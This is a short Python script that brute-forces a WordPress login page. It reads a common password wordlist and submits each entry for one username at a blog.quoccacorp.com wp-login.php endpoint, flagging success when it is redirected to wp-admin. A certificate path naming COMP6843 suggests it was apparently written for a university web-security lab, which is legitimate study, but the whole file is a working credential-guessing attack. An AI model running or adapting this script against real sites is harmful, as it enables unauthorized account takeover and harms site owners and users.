import requests
import time


class colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'


url = 'https://blog.quoccacorp.com/wp-login.php'
username = 'ihaveabadpassword'
password_file = '/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt'

with open(password_file, 'r') as file:
    passwords = [line.strip() for line in file]

for password in passwords:
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': 'https://blog.quoccacorp.com/wp-admin/',
        'testcookie': '1'
    }

    with requests.Session() as s:
        s.cert = "/home/archer/uni/COMP6843/z3291100.pem"
        s.get(url)
        response = s.post(url, data=data)

        if 'dashboard' in response.url or 'wp-admin' in response.url:
            print(f'{colors.GREEN}[+]{colors.RESET} {password}')
            break
        elif 'incorrect' in response.text or 'empty' in response.text:
            print(f'{colors.RED}[-]{colors.RESET} {password}')
        else:
            print(f'{colors.YELLOW}[?]{colors.RESET} {password}')

    time.sleep(0.1)
